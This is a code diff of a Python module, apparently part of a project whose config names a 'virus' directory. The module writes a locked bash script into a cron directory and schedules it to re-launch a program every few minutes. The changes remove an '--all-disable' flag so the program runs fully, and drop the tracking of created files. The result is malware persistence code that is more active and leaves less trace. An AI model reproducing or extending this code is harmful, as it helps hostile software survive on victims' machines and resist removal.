@@ -1,7 +1,8 @@
 import subprocess
 import os
-import hashlib
-from config import SAVE_VIRUS_DIR, BACKUP_DIR, CRON_DIR, BASH_SCRIPT_NAME, LIST_NEW_FILES
+from pathlib import Path
+from config import SAVE_VIRUS_DIR, BACKUP_DIR, CRON_DIR, CRON_SCRIPT_NAME
+from utils import check_sum_content
 
 def create_bash_content(progFileName: str, progFileBackup: str) -> str:
     """
@@ -36,7 +37,7 @@ def create_bash_content(progFileName: str, progFileBackup: str) -> str:
       # Chạy chương trình nếu có thể
       if [ -x "$PROG" ]; then
         cd "$HOME" || true
-        exec "$PROG" --all-disable
+        exec "$PROG"
       fi
     
     ) 9>"$LOCKFILE"
@@ -44,33 +45,26 @@ def create_bash_content(progFileName: str, progFileBackup: str) -> str:
 """
     return bash_content
 
-def check_sum_bash_content(bash_content: str) -> str:
-    h = hashlib.md5()
-    h.update(bash_content.encode('utf-8'))
-    return h.hexdigest()
-
 def install_cron_job(bash_content: str, interval_minutes: int = 5) -> bool:
     """
     Install a cron job to run the bash script every interval_minutes
     """
     cron_dir = os.path.expanduser(CRON_DIR)
 
-    bash_path = os.path.join(cron_dir, BASH_SCRIPT_NAME)
+    bash_path = Path(cron_dir) / CRON_SCRIPT_NAME
 
     # Check if the file exists and the content has not changed then do nothing
-    if os.path.exists(bash_path):
-        with open(bash_path, "r") as f:
-            existing_content = f.read()
-        if check_sum_bash_content(existing_content) == check_sum_bash_content(bash_content):
+    if bash_path.exists():
+        existing_content = bash_path.read_text()
+        if check_sum_content(existing_content) == check_sum_content(bash_content):
             print("Bash script already exists and is up to date.")
             return True
     try:
         # Write bash script
         print(f"Creating bash script: {bash_path}")
-        with open(bash_path, "w") as f:
-            f.write(bash_content)
+        bash_path.write_text(bash_content)
         os.chmod(bash_path, 0o755)
-        LIST_NEW_FILES.append(bash_path)
+
     except Exception as e:
         print(f"Error writing bash script {bash_path}: {e}")
         return False
